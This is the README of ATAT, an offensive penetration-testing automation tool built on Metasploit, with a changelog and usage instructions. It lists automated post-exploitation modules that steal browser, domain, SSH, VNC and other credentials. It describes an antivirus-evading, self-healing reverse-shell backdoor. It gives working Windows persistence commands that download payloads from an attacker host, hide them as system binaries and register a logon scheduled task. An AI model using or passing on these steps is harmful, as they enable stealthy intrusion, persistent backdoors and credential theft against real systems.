***RTFM***RTFM***RTFM***RTFM***
# ATAT
Attack Team Automation Tool for automating penetration testing operations. Based on ezsploit by rand0m1ze. Durandal backdoor builder created by Travis Weathers (Skysploit).

v1.8
Added Powershell Empire & DeathStar Integration,
Added support for Apache Struts/Tomcat/Etc. exploits,
Added support for Java JMX exploitation,
Added support for Java RMI exploitation,
Added support for linux post exploitation,
Added support for load balancer detection,
Added support for SSLScan (automated via masscan results),
Added support for Masscan of all TCP ports (informs SSLScan),
Added Android persistent reverse Meterpreter APK builder,
Added DBD persistent backdoor builder by Skysploit with enhanced persistence instructions,
Added dependency checker by Skysploit,
Added fully automated MSF Post Exploitation on all sessions acquired for the following post ex activities:
- enumerate hosts
- dump cached domain creds
- verify if you are on a vm
- group policy preferences (dump local admin creds if pushed via GPO)
- steal SVN creds (code repository)
- steal scp creds
- enumerate internal sites the user visits
- all apps installed on target
- Chrome, dump cookies, and saved creds
- IE, dump cookies, and saved creds
- Firefox, dump cookies, and saved creds
- grab RDP sessions
- grab local settings and local accounts
- dumps WPA PSK & WEP passwords
- dumps passwords on the local windows system including domain accounts
- dump .ssh directory for known hosts
- gather OS environment variables
- dump /etc/shadow
- dump user list plus bash/mysql/vim/lastlog/sudoers history
- enum packages, services, mounts, user list, bash
- check for AV, rootkit, HIDS/HIPS, firewalls, etc
- dump IPTables, interfaces, wifi info, open ports
- collect config files for commonly installed apps and services
- grab arp table from target
- enumerate the domain, domain users, and domain tokens
- grab the host file
- dump logged on users
- dump MS product keys
- steal VNC creds
- enumerate services & shares on target
- steal SNMP inforamtion
- dump DNS cache
- steal GPG credentials/certificates
- grab the history of mounted USB devices
- assess the target and suggest local exploits for privilege escalation or other operations

--- INSTRUCTIONS TO RUN THIS FROM /home/<profile>/ instead of running as root (Doing this will break Empire & DeathStar functionality)---
The ATAT folder must be duplicated in /root & ~/ to run properly unless you are on Kali (logged in as root) or you are running
another distro logged in as root (duplicating this folder only needs to be done once and does not need to be updated ever).
You then do not have to run the script from /root if you place one copy of the ATAT folder in ~/ and one copy in /root.
Placing a copy of the ATAT folder in /root/ in this circumstance is only so you have the TXT files 
accessible by ATAT when it run as sudo. Then you simply run ATAT via sudo ./ATAT.sh from ~/ATAT.
All targets and/or ports must be added into their respective TXT files in /root/ as referenced above and detailed below.
Adding your targets/ports to the TXT files in ~/ATAT will not work under this setup
*You can have the ATAT folder in /root only if you wish; and you can run it from there and disregard all of these instructions.*

usage:
chmod +x ~/ATAT/ATAT.sh
cd ATAT
sudo ./ATAT.sh

You MUST load your PORTS or IPs into their appropriate TXT files for options listed below to work! (one per line)

OPTION Multi-Target:
/root/ATAT/MSF_targets.txt

OPTION Multi-Port:
/root/ATAT/MSF_target_ports.txt

OPTION Multi-Port Auxiliary:
/root/ATAT/MSF_AUX_target_ports.txt

OPTION Multi-Target Struts & Multi-Target Tomcat:
/root/ATAT/MSF_targets.txt

OPTION Multi_target Java JMX & Multi-Target Java RMI:
/root/ATAT/MSF_targets.txt

OPTION Multi-Target SNMP Enumeration:
/root/ATAT/MSF_targets.txt

OPTION Multi-Target Load Balancer Detection:
/root/ATAT/MSF_targets.txt
Results output to screen and the ATAT folder in LBD_Results.txt.
OUTPUT FILES APPEND DATA DUE TO THE NATURE OF THESE LOOPED OPERATIONS; THEREFORE, ALL OUTPUT FILES MUST BE DELETED OR CLEANED OUT PERIODICALLY TO GET RID OF PREVIOUS SCANS' RESULTS

OPTION Multi-Target SSLScan:
~/ATAT/~SSLScan_masscan_results.txt 
Targets can be entered as just IPs/URLs for scanning on the default port 443; or you can enter colon delimited lists to specify the port to scan each target on as follows:
1.2.3.4:22
1.2.3.4:8443
1.3.4.5:990
1.3.4.5:547
Results output to screen and the ATAT folder in SSLScan_Results.txt. All output is further processed and grouped into the following categories:
RC4 findings in rc4.txt
SSLv2 findings in sslv2.txt
Heartbleed Findings in heartbleed_targets.txt
Freak vuln findings in freak.txt
Weak Cipher Findings in weak_ciphers.txt
Expired Certificate Findings in expired_certs.txt
SSL Certificate Details in ssl_certs.txt
Masscan results also output to ~SSLScan_masscan_results.txt. This file contains all targets and discovered ports colon delimited one per line as above.
SSLScan can be run automatically after running masscan to check for SSL issues on all discovered ports on every host in scope effortlessly.
OUTPUT FILES APPEND DATA DUE TO THE NATURE OF THESE LOOPED OPERATIONS; THEREFORE, ALL OUTPUT FILES MUST BE DELETED OR CLEANED OUT PERIODICALLY TO GET RID OF PREVIOUS SCANS' RESULTS

OPTION Masscan All TCP Ports:
/root/ATAT/MSF_targets.txt
This masscans all TCP ports for all targets at a reasonable rate (--rate 1000)
Results output to screen and the ATAT folder in Open_Ports.txt.
Masscan results also output to ~SSLScan_masscan_results.txt. This file contains all targets and discovered ports colon delimited one per line as follows:
1.2.3.4:22
1.2.3.4:8443
1.3.4.5:990
1.3.4.5:547
SSLScan can be run automatically after running masscan to check for SSL issues on all discovered ports on every host in scope effortlessly.
OUTPUT FILES APPEND DATA DUE TO THE NATURE OF THESE LOOPED OPERATIONS; THEREFORE, ALL OUTPUT FILES MUST BE DELETED OR CLEANED OUT PERIODICALLY TO GET RID OF PREVIOUS SCANS' RESULTS

OPTION Dependency Checker:
Dependencies option will attempt to install the required dependencies for ATAT. DBD Installer option must be run on your attacker box in order to receive DBD reverse shells.
Powershell Empire & DeathStar Option Should Only Be Run If You Are Logged In As root!!

OPTION Persistence:
PLEASE DO NOT submit payloads generated to virustotal or any other online scanner!!
DBD reverse shells will self heal a dropped connection in 10 minute intervals. If the connection is killed on either end or is lost for any reason, the connection will reconnect after a 10 minute period. All sessions are 128bit AES encrypted.

WINDOWS:
ATAT creates a taskmgnt.txt & winmgnt.txt for Windows DBD builder option payloads and places them in the /var/www/html/ directory before starting Apache on the attacker's machine (to host the payloads for access by the target machines). Both of these TXT files must be converted to EXE format once they have been transmitted to the target. Taskmgnt(nominally obfuscated PSEXEC) can be used to execute the winmgnt (DBD backdoor) so it is executed by a MS signed binary for more stealth/evasion. DBD itself is not currently flagged by any AV; but sometimes it is necessary to have your EXE run by a MS signed binary.
Windows deployment instructions for reboot persistence:
Now move the "taskmgnt.txt" & "winmgnt.txt" files to the target, rename & hide them, then launch backdoor with MS signed ofuscated PsExec.
While this backdoor is self healing; it will not auto start at reboot. To get your shell back after a reboot, enter the following on the target (one command per line):

powershell (new-object System.Net.WebClient).DownloadFile('http://<ATTACKER_IPADDRESS>/winmgnt.txt','%WINDIR%\System32\winmgnt.exe')
powershell (new-object System.Net.WebClient).DownloadFile('http://<ATTACKER_IPADDRESS>/taskmgnt.txt','%WINDIR%\System32\taskmgnt.exe')
attrib +H +S \"%WINDIR%\System32\winmgnt.exe\"
attrib +H +S \"%WINDIR%\System32\taskmgnt.exe\"
%WINDIR%\System32\taskmgnt.exe -i -d -s /accepteula %WINDIR%\System32\winmgnt.exe
schtasks /create /sc onlogon /tn WindowsMgr /rl highest /tr \"%WINDIR%\System32\winmgnt.exe\"

*NIX:
ATAT creates a 'dbd' binary for *nix DBD builder option payloads and places it in the /var/www/html/ directory. 

For post exploitation once you acquire sessions via ATAT,

METHOD 1: 
Launch your listener with menu option 2. ATAT will intelligently detect the appropriate post modules to run against each session you receive.  However, due to a bug in the MSF AutoRunScript feature you must do the following: From your listener window, after all of your sessions are in (after your attacks have completed) hit enter to drop down to your msf expoit(multi/handler)> prompt and then enter the following command without double quotes: "resource '/root/ATAT/ATAT_multi_post.rc'" Check your loot files in /root/.msf4/loot/

METHOD 2:
This will be updated once the aforementioned feature has been fixed by Rapid7.

OPTION: Powershell Empire:
THIS SECTION ONLY WORKS FROM THE /root/ CONTEXT!!
IF YOU'RE NOT LOGGED IN AS root, DO NOT USE THESE OPTIONS!!
Empire & DeathStar MUST be installed in /root/!!

Step 1 must br run initially; after that you need to open another ATAT instance in a separate window and launch Step 2.
